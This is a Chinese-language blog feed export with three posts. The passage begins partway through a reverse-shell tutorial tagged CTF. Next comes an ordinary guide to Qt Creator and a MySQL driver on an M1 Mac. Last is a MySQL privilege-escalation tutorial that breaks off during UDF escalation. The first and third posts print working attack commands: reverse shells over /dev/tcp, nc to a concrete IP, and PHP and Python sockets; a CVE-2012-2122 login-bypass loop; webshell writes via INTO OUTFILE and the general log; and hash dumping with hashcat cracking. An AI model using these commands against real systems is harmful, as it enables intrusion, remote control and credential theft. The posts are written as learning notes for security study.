/bin/bash<br></code></pre></td></tr></table></figure></li></ul></li></ul></blockquote><h4 id="其他形式"><a href="#其他形式" class="headerlink" title="其他形式"></a>其他形式</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">exec 5&lt;&gt;/dev/tcp/x.x.x.x/4444;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done<br><br>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 124.221.124.106 3344 &gt; /tmp/f<br></code></pre></td></tr></table></figure><blockquote><ul><li>第一条命令 建立与x.x.x.x:4444的tcp连接，并将标准输入输出作为device 5的标准输入输出</li><li>第二条cat &lt;&amp;5 获取device5的输入; <code>while read line; do $line 2&gt;&amp;5 &gt;&amp;5</code> 一旦获取到命令便运行 然后将标准输入输出以及标准错误输出到device5中</li></ul></blockquote><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301310256792.jpg" alt="image-20220926224353002"></p><h3 id="基于编程语言的反弹shell"><a href="#基于编程语言的反弹shell" class="headerlink" title="基于编程语言的反弹shell"></a>基于编程语言的反弹shell</h3><p>1、基于PHP的反弹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">php -r &#x27;$sock=fsockopen(&quot;ip&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;<br></code></pre></td></tr></table></figure><p>2、基于python反弹shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((&quot;ip&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;<br></code></pre></td></tr></table></figure><blockquote><p>使用socket建立起tcp连接</p><p>os.dup2() 方法用于将一个文件描述符 fd 复制到另一个 fd2，这里将标准输入、标准输出、标准错误都集成到当前socket的文件描述符上,然后再产生一个 bash 交互环境</p></blockquote><p>2、受到disable_functions影响，导致fsockopen或者exec不可用。<br>当监听端收不到连接就是fsockopen被禁用，又或者收到连接后又立马断开则是exec被禁用<br>解决方法：<br>php在命令行中执行时修改 php.ini 是立即生效的，因此我们直接重命名php.ini文件即可:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">mv /etc/php.ini /etc/php.ini.bak<br></code></pre></td></tr></table></figure><p>当然，文件位置并不是一定在这里。可以把常用位置都试一遍。当然了，实战中可千万不要这么搞，业务烂了就呜呜呜了。</p><p>参考博客:</p><ol><li><a href="https://blog.csdn.net/haoge1998/article/details/124259580?spm=1001.2101.3001.6650.6&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-6-124259580-blog-102993592.pc_relevant_aa&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-6-124259580-blog-102993592.pc_relevant_aa">反弹shell原理</a></li><li><a href="https://www.sqlsec.com/2019/10/nc.html">nc命令教程</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>shell</tag>
      
      <tag>nc</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>M1 mac下搭建使用qt creator + QMYSQL驱动</title>
    <link href="/2022/08/06/M1-mac%E4%B8%8B%E6%90%AD%E5%BB%BA%E4%BD%BF%E7%94%A8qt-creator-QMYSQL%E9%A9%B1%E5%8A%A8/"/>
    <url>/2022/08/06/M1-mac%E4%B8%8B%E6%90%AD%E5%BB%BA%E4%BD%BF%E7%94%A8qt-creator-QMYSQL%E9%A9%B1%E5%8A%A8/</url>
    
    <content type="html"><![CDATA[<h3 id="💡前提：安装Xcode"><a href="#💡前提：安装Xcode" class="headerlink" title="💡前提：安装Xcode"></a>💡前提：安装Xcode</h3><h2 id="安装homebrew"><a href="#安装homebrew" class="headerlink" title="安装homebrew"></a>安装homebrew</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">/bin/zsh -c &quot;$(curl -fsSL https://gitee.com/cunkai/HomebrewCN/raw/master/Homebrew.sh)&quot;<br></code></pre></td></tr></table></figure><p>选择中科大镜像，并安装弹窗中的命令行开发者工具，安装完再执行以上命令</p><p>切换国内安装源</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd &quot;$(brew --repo)&quot; &amp;&amp; git remote set-url origin git://mirrors.ustc.edu.cn/brew.git &amp;&amp; cd &quot;$(brew --repo)/Library/Taps/homebrew/homebrew-core&quot; &amp;&amp; git remote set-url origin https://mirrors.ustc.edu.cn/homebrew-core.git &amp;&amp; cd &quot;$(brew --repo)/Library/Taps/homebrew/homebrew-cask&quot; &amp;&amp; git remote set-url origin https://mirrors.ustc.edu.cn/homebrew-cask.git &amp;&amp; cd &quot;$(brew --repo)&quot;/Library/Taps/homebrew/homebrew-cask-versions &amp;&amp; git remote set-url origin https://github.com/Homebrew/homebrew-cask-versions.git<br></code></pre></td></tr></table></figure><p>重启终端，下载qt</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">brew install qt<br></code></pre></td></tr></table></figure><p>检验是否安装成功,执行以下命令，回显信息比较多，可以看见路径</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">brew info qt<br></code></pre></td></tr></table></figure><p><img src="/../images/e6c9d24egy1h1ub18t5pfj20vm0jq7a1.png" alt="1"></p><h2 id="安装HomeBrew-Cask"><a href="#安装HomeBrew-Cask" class="headerlink" title="安装HomeBrew-Cask"></a>安装HomeBrew-Cask</h2><p>cask可以安装.app的软件</p><p>方法一：利用国内源手动clone下载（推荐）<br>创建homebrew-cask文件夹<br>进入homebrew目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> <span class="hljs-string">&quot;<span class="hljs-subst">$(brew --repo)</span>/Library/Taps/homebrew/&quot;</span><br></code></pre></td></tr></table></figure><p>创建homebrew-cask文件夹</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">mkdir homebrew-cask<br></code></pre></td></tr></table></figure><p>开始clone</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone git:<span class="hljs-regexp">//mi</span>rrors.ustc.edu.cn<span class="hljs-regexp">/homebrew-cask.git/u</span>sr<span class="hljs-regexp">/local/</span>Homebrew<span class="hljs-regexp">/Library/</span>Taps<span class="hljs-regexp">/homebrew/</span>homebrew-cask<br></code></pre></td></tr></table></figure><p>方法二：利用官网文件安装<br>从官网上下载<code>homebrew-cask-master.zip</code>压缩包，解压后将文件夹名改为<code>homebrew-cask</code><br>然后将其拷贝放入<code>/usr/local/Homebrew/Library/Taps/homebrew</code>中，与<code>homebrew-core</code>文件夹同级    </p><blockquote><p>官网: <a href="https://github.com/Homebrew/homebrew-cask">https://github.com/Homebrew/homebrew-cask</a></p></blockquote><h2 id="安装qt-creator"><a href="#安装qt-creator" class="headerlink" title="安装qt creator"></a>安装qt creator</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">brew </span><span class="hljs-keyword">install </span>qt-creator<br></code></pre></td></tr></table></figure><p>安装完发现启动台多了一个软件，打开</p><p><img src="/../images/e6c9d24egy1h1ub7miil3j20bo086wej.png" alt="."></p><h2 id="配置qt-creator"><a href="#配置qt-creator" class="headerlink" title="配置qt creator"></a>配置qt creator</h2><p>打开首选项<img src="/../images/e6c9d24egy1h1ub8lv3wbj20ds0e6gmk.png?" alt="."></p><p>配置kits，主要是Qt Version和Debuggers</p><p>e6c9d24egy1h1ub8lv3wbj20ds0e6gmk<img src="/../images/e6c9d24egy1h1ucbt7jxhj21ef0u0jvk.png" alt="2"></p><h3 id="配置Qt-Version"><a href="#配置Qt-Version" class="headerlink" title="配置Qt Version"></a>配置Qt Version</h3><p>在终端先查看qt路径</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">brew</span> <span class="hljs-literal">info</span> qt<br></code></pre></td></tr></table></figure><p><img src="/../images/e6c9d24egy1h1ucdiut0nj21ce0hoq9l.png" alt="3"></p><blockquote><p>以我这里为例是在<code>/opt/homebrew/Cellar/qt/6.2.3_1</code></p></blockquote><p>进入该文件夹，访问<code>bin</code>文件夹，找到qmake文件，最后将该路径填入Qt version</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/opt/</span>homebrew<span class="hljs-regexp">/Cellar/</span>qt<span class="hljs-regexp">/6.2.3_1/</span>bin/qmake<br></code></pre></td></tr></table></figure><p><img src="/../images/e6c9d24egy1h1ucgvl5bhj21f70u0dk0.png" alt="4"></p><h3 id="配置Debuggers"><a href="#配置Debuggers" class="headerlink" title="配置Debuggers"></a>配置Debuggers</h3><p>一般有默认自动检测到的LLDB，如果没有就添加我图示中Xcode下的LLDB(要先装Xcode)</p><p>路径：<code>/Applications/Xcode.app/Contents/Developer/usr/bin/lldb</code></p><p><img src="/../images/e6c9d24egy1h1ucjcdt7hj21dx0u00vy.png" alt="5"></p><h3 id="返回到Kits选择刚刚配置好的版本"><a href="#返回到Kits选择刚刚配置好的版本" class="headerlink" title="返回到Kits选择刚刚配置好的版本"></a>返回到Kits选择刚刚配置好的版本</h3><p>一般情况下这里的编译器(Compiler)都会自动检测到本机所带环境，不用更改</p><p><img src="/../images/e6c9d24egy1h1uckxzx6bj21n00u0q81.png" alt="6"></p><h3 id="新建一个项目"><a href="#新建一个项目" class="headerlink" title="新建一个项目"></a>新建一个项目</h3><p><img src="/../images/e6c9d24egy1h1ucm7hh0gj21ni0u076u.png" alt="7"></p><h3 id="选择模版"><a href="#选择模版" class="headerlink" title="选择模版"></a>选择模版</h3><p><img src="/../images/e6c9d24egy1h1ucmnslqlj21c60u0acl.png" alt="8"></p><h3 id="选择路径-不能带中文"><a href="#选择路径-不能带中文" class="headerlink" title="选择路径(不能带中文)"></a>选择路径(不能带中文)</h3><p><img src="/../images/e6c9d24egy1h1ucnji2ynj218g0tcwgp.png" alt="9"></p><h3 id="选择qmake"><a href="#选择qmake" class="headerlink" title="选择qmake"></a>选择qmake</h3><p><img src="/../images/e6c9d24egy1h1uco09mb9j218g0tcgn0.png" alt="10"></p><h3 id="剩下一直都点继续，直到Kits-选择刚刚配置的"><a href="#剩下一直都点继续，直到Kits-选择刚刚配置的" class="headerlink" title="剩下一直都点继续，直到Kits,选择刚刚配置的"></a>剩下一直都点继续，直到Kits,选择刚刚配置的</h3><p><img src="/../images/e6c9d24egy1h1ucp7tqxcj218g0tc76c.png" alt="11"></p><h3 id="构建项目"><a href="#构建项目" class="headerlink" title="构建项目"></a>构建项目</h3><p><img src="/../images/e6c9d24egy1h1ucpqyve4j218g0tcjtd.png" alt="12"></p><h3 id="运行项目，会自动生成一个默认的空白框"><a href="#运行项目，会自动生成一个默认的空白框" class="headerlink" title="运行项目，会自动生成一个默认的空白框"></a>运行项目，会自动生成一个默认的空白框</h3><p><img src="/../images/e6c9d24egy1h1ucr1dk8zj20tg0gqdgs.png" alt="."></p><p><img src="/../images/e6c9d24egy1h1ucrjmkltj20zu0si750.png" alt="."></p><blockquote><p>具体的使用可以去b站搜qt教程</p></blockquote><h2 id="Qt搭配mysql"><a href="#Qt搭配mysql" class="headerlink" title="Qt搭配mysql"></a>Qt搭配mysql</h2><h3 id="动态链接库下载"><a href="#动态链接库下载" class="headerlink" title="动态链接库下载"></a>动态链接库下载</h3><p>若要搭配mysql写项目，需要添加动态链接库<code>libqsqlmysql.dylib</code>，网上大部分教程都是下载qt源码进行编译，但由于M1是arm64架构，编译的过程会有很多报错以及路径不对的问题，网上能下载的动态链接库也大多不是arm架构的，因此不得不提到mac下的神器<code>homebrew</code>,终端执行命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">brew install qt-mysql<br></code></pre></td></tr></table></figure><blockquote><p>brew会自动匹配下载最新qt版本的动态链接库，因此建议qt也使用homebrew安装</p></blockquote><p>进入目录<code>/opt/homebrew/Cellar/qt-mysql/6.2.3/share/qt/plugins/sqldrivers</code>将这个动态链接库放到<code>/opt/homebrew/Cellar/qt/6.2.3_1/share/qt/plugins/sqldrivers</code>中</p><p><img src="/../images/e6c9d24ely1h4xfpipwhjj21fg0okgng.png" alt="13"></p><blockquote><p>注意版本号对应</p></blockquote><h3 id="引入SQL模块"><a href="#引入SQL模块" class="headerlink" title="引入SQL模块"></a>引入SQL模块</h3><p>在项目的.pro文件的首行加上sql</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp">QT       += core gui sql <span class="hljs-comment">//修改处</span><br><br><span class="hljs-built_in">greaterThan</span>(QT_MAJOR_VERSION, <span class="hljs-number">4</span>): QT += widgets<br><br>CONFIG += c++<span class="hljs-number">17</span><br><br><span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><h3 id="连接mysql数据库"><a href="#连接mysql数据库" class="headerlink" title="连接mysql数据库"></a>连接mysql数据库</h3><p>进入qt项目执行以下代码打印数据库驱动</p><p>mainwindow.cpp</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mainwindow.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;ui_mainwindow.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;QSqlDatabase&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;QDebug&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;QMessageBox&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;QSqlError&gt;</span></span><br><span class="hljs-comment">//...</span><br><span class="hljs-built_in">qDebug</span>()&lt;&lt;QSqlDatabase::<span class="hljs-built_in">drivers</span>();<span class="hljs-comment">//查看当前可用驱动</span><br></code></pre></td></tr></table></figure><blockquote><p>可用驱动中有QMYSQL即为成功</p><p><img src="/../images/e6c9d24ely1h4xg0zi3z4j20gk02yglv.png" alt="."></p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp">QSqlDatabase db=QSqlDatabase::<span class="hljs-built_in">addDatabase</span>(<span class="hljs-string">&quot;QMYSQL&quot;</span>);<span class="hljs-comment">//添加一个数据库</span><br>db.<span class="hljs-built_in">setHostName</span>(<span class="hljs-string">&quot;127.0.0.1&quot;</span>);<span class="hljs-comment">//设置主机ip</span><br>db.<span class="hljs-built_in">setUserName</span>(<span class="hljs-string">&quot;username&quot;</span>);<span class="hljs-comment">//mysql数据库用户名</span><br>db.<span class="hljs-built_in">setPassword</span>(<span class="hljs-string">&quot;password&quot;</span>);<span class="hljs-comment">//密码</span><br>db.<span class="hljs-built_in">setDatabaseName</span>(<span class="hljs-string">&quot;db&quot;</span>);<span class="hljs-comment">//连接的数据库名</span><br><span class="hljs-keyword">if</span>(db.<span class="hljs-built_in">open</span>()==<span class="hljs-literal">false</span>)&#123;<span class="hljs-comment">//打开失败的警告</span><br>    QMessageBox::<span class="hljs-built_in">warning</span>(<span class="hljs-keyword">this</span>,<span class="hljs-string">&quot;waring&quot;</span>,db.<span class="hljs-built_in">lastError</span>().<span class="hljs-built_in">text</span>());<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>运行项目只要没有警告框弹出就说明连接数据库成功</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>环境搭建</category>
      
    </categories>
    
    
    <tags>
      
      <tag>mac</tag>
      
      <tag>qt</tag>
      
      <tag>mysql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Mysql提权</title>
    <link href="/2022/07/08/Mysql%E6%8F%90%E6%9D%83/"/>
    <url>/2022/07/08/Mysql%E6%8F%90%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<h1 id="Mysql提权"><a href="#Mysql提权" class="headerlink" title="Mysql提权"></a>Mysql提权</h1><h2 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h2><ol><li><strong>具有MySQL的root权限，且MySQL以system权限运行。</strong></li><li><strong>具有执行SQL语句的权限。</strong></li></ol><p><strong>获取root密码的方法：</strong></p><ol><li><p>MySQL 3306 端口弱口令爆破</p></li><li><p>sqlmap 注入的 <code>--sql-shell</code> 模式</p><blockquote><p>使用条件:数据库开启了shell能执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u www.xxxx/aboutus.php?<span class="hljs-built_in">id</span>=1 --sql-shell<br></code></pre></td></tr></table></figure><p>进入了交互式页面，输入 select host,user,password from mysql.user这条命令，可以查询数据库的用户和密码</p></blockquote></li><li><p>网站的数据库配置文件中拿到明文密码信息</p></li><li><p>CVE-2012-2122 等这类漏洞直接拿下 MySQL 权限</p><blockquote><p>Mysql 身份认证绕过漏洞（CVE-2012-2122）,当连接MariaDB&#x2F;MySQL时，输入的密码会与期望的正确密码比较，由于不正确的处理，会导致即便是memcmp()返回一个非零值，也会使MySQL认为两个密码是相同的。也就是说<u>只要知道用户名</u>，不断尝试就能够直接登入SQL数据库。官方说法是256次会成功一次</p><p>payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> `<span class="hljs-built_in">seq</span> 1 1000`; <span class="hljs-keyword">do</span> mysql -uroot -pwrong -h your-ip -P3306 ; <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure></blockquote></li></ol><h2 id="Webshell权限"><a href="#Webshell权限" class="headerlink" title="Webshell权限"></a>Webshell权限</h2><h3 id="into-oufile-写-shell"><a href="#into-oufile-写-shell" class="headerlink" title="into oufile 写 shell"></a>into oufile 写 shell</h3><h4 id="写shell条件"><a href="#写shell条件" class="headerlink" title="写shell条件"></a>写shell条件</h4><ul><li>知道网站物理路径</li><li>高权限数据库用户</li><li>load_file() 开启 即 secure_file_priv 无限制</li><li>网站路径有写入权限</li></ul><p>首先基础语法查询是否 secure_file_priv 没有限制</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; show global variables like <span class="hljs-string">&#x27;%secure_file_priv%&#x27;</span>;<br>+------------------+-------+<br>| Variable_name    | Value |<br>+------------------+-------+<br>| secure_file_priv |       |<br>+------------------+-------+<br></code></pre></td></tr></table></figure><blockquote><p>不同value值对应</p><table><thead><tr><th align="left">Value</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">NULL</td><td align="left">不允许导入或导出</td></tr><tr><td align="left">&#x2F;tmp</td><td align="left">只允许在 &#x2F;tmp 目录导入导出</td></tr><tr><td align="left">空</td><td align="left">不限制目录</td></tr></tbody></table><p>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以<u>向任意绝对路径写文件</u></p><p>在 MySQL 5.5之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件</p></blockquote><p>若value为空，即不限制目录时，可以使用原生SQL语句来写shell</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;&lt;?php phpinfo(); ?&gt;&#x27;</span> <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&#x27;/var/www/html/info.php&#x27;</span>;<br></code></pre></td></tr></table></figure><p>sqlmap中做法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://x.x.x.x/?id=x&quot;</span> --file-write=<span class="hljs-string">&quot;/Users/guang/Desktop/shell.php&quot;</span> --file-dest=<span class="hljs-string">&quot;/var/www/html/test/shell.php&quot;</span><br></code></pre></td></tr></table></figure><h3 id="日志文件写shell"><a href="#日志文件写shell" class="headerlink" title="日志文件写shell"></a>日志文件写shell</h3><ul><li>Web 文件夹宽松权限可以写入</li><li>Windows 系统下</li><li>高权限运行 MySQL 或者 Apache</li></ul><p>MySQL 5.0 版本以上会创建日志文件，可以通过修改日志的全局变量来 getshell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; SHOW VARIABLES LIKE <span class="hljs-string">&#x27;general%&#x27;</span>;<br>+------------------+---------------------------------+<br>| Variable_name    | Value                           |<br>+------------------+---------------------------------+<br>| general_log      | OFF                             |<br>| general_log_file | /var/lib/mysql/c1595d3a029a.<span class="hljs-built_in">log</span> |<br>+------------------+---------------------------------+<br></code></pre></td></tr></table></figure><p><code>general_log</code> 默认关闭，开启它可以记录用户输入的每条命令，会把其保存在对应的日志文件中。</p><p>可以尝试自定义日志文件，并向日志文件里面写入内容的话，那么就可以成功 getshell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 更改日志文件位置</span><br><span class="hljs-built_in">set</span> global general_log = <span class="hljs-string">&quot;ON&quot;</span>;<br><span class="hljs-built_in">set</span> global general_log_file=<span class="hljs-string">&#x27;/var/www/html/info.php&#x27;</span>;<br><br><span class="hljs-comment"># 查看当前配置</span><br>mysql&gt; SHOW VARIABLES LIKE <span class="hljs-string">&#x27;general%&#x27;</span>;<br>+------------------+-----------------------------+<br>| Variable_name    | Value                       |<br>+------------------+-----------------------------+<br>| general_log      | ON                          |<br>| general_log_file | /var/www/html/info.php |<br>+------------------+-----------------------------+<br><br><span class="hljs-comment"># 往日志里面写入 payload</span><br>select <span class="hljs-string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>;<br><br><span class="hljs-comment"># 此时已经写到 info.php 文件当中了</span><br>root@c1595d3a029a:/var/www/html/$ <span class="hljs-built_in">cat</span> info.php <br>/usr/sbin/mysqld, Version: 5.5.61-0ubuntu0.14.04.1 ((Ubuntu)). started with:<br>Tcp port: 3306  Unix socket: /var/run/mysqld/mysqld.sock<br>Time                 Id Command    Argument<br>201031 21:14:46       40 Query    SHOW VARIABLES LIKE <span class="hljs-string">&#x27;general%&#x27;</span><br>201031 21:15:34       40 Query    select <span class="hljs-string">&#x27;&lt;?php phpinfo();?&gt;</span><br></code></pre></td></tr></table></figure><p>这里虽然可以成功写入，但是这个 info.php 是 MySQL 创建的 ：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">-rw-rw---- 1 mysql mysql 293 Oct 31 21:15 info.php<br></code></pre></td></tr></table></figure><p>Apache 访问这个 php 文件会出现 HTTP 500 的状态码，结论是 root 系统这种情况基本上不会成功，只有在 Windows 系统下成功率会高一些，不过这里还是可以当做小知识点来学习记录。</p><h2 id="Hash-获取与解密"><a href="#Hash-获取与解密" class="headerlink" title="Hash 获取与解密"></a>Hash 获取与解密</h2><h3 id="获取"><a href="#获取" class="headerlink" title="获取"></a>获取</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># MySQL &lt;= 5.6 版本</span><br>mysql&gt; select host, user, password from mysql.user;<br><br><span class="hljs-comment"># MySQL &gt;= 5.7 版本</span><br>mysql&gt; select host,user,authentication_string from mysql.user;<br></code></pre></td></tr></table></figure><h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><p>在线网站来解密，如国内的 CMD5</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h21dwwaf21j214808y3ze.jpg" alt="img"></p><p>也可以通过 Hashcat 来手动跑字典，基本上使用 GPU 破解的话也是可以秒破解的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hashcat -a 0 -m 300 --force <span class="hljs-string">&#x27;8232A1298A49F710DBEE0B330C42EEC825D4190A&#x27;</span> password.txt -O<br></code></pre></td></tr></table></figure><p><strong>-a 破解模式</strong></p><p>指定要使用的破解模式，其值参考后面对参数</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs r"><span class="hljs-operator">-</span> <span class="hljs-punctuation">[</span> Attack Modes <span class="hljs-punctuation">]</span> <span class="hljs-operator">-</span><br><br>  <span class="hljs-comment"># | Mode</span><br> <span class="hljs-operator">==</span><span class="hljs-operator">=</span><span class="hljs-operator">+</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><br>  <span class="hljs-number">0</span> <span class="hljs-operator">|</span> Straight                <span class="hljs-comment"># 直接字典破解</span><br>  <span class="hljs-number">1</span> <span class="hljs-operator">|</span> Combination             <span class="hljs-comment"># 组合破解</span><br>  <span class="hljs-number">3</span> <span class="hljs-operator">|</span> Brute<span class="hljs-operator">-</span>force             <span class="hljs-comment"># 掩码暴力破解</span><br>  <span class="hljs-number">6</span> <span class="hljs-operator">|</span> Hybrid Wordlist <span class="hljs-operator">+</span> Mask  <span class="hljs-comment"># 字典+掩码破解</span><br>  <span class="hljs-number">7</span> <span class="hljs-operator">|</span> Hybrid Mask <span class="hljs-operator">+</span> Wordlist  <span class="hljs-comment"># 掩码+字典破解</span><br></code></pre></td></tr></table></figure><p><strong>-m 破解hash类型</strong></p><p>指定要破解的hash类型，后面跟hash类型对应的数字，具体类型详见下表：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">12   | PostgreSQL                                       | Database Server<br>131  | MSSQL (2000)                                     | Database Server<br>132  | MSSQL (2005)                                     | Database Server<br>1731 | MSSQL (2012, 2014)                               | Database Server<br>200  | MySQL323                                         | Database Server<br>300  | MySQL4.1/MySQL5                                  | Database Server<br>...<br></code></pre></td></tr></table></figure><p><strong>–force</strong></p><p>忽略破解过程中的警告信息</p><p><strong>-O</strong></p><p><code>--optimized-kernel-enable</code> 启用优化的内核（限制密码长度</p><h2 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h2><p>用户通过自定义函数，使得在SQL语句中调用新函数</p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> version();   # 获取数据库版本<br><span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>();  # 获取数据库用户<br><span class="hljs-keyword">select</span> @<span class="hljs-variable">@basedir</span>;   # 获取数据库安装目录<br><span 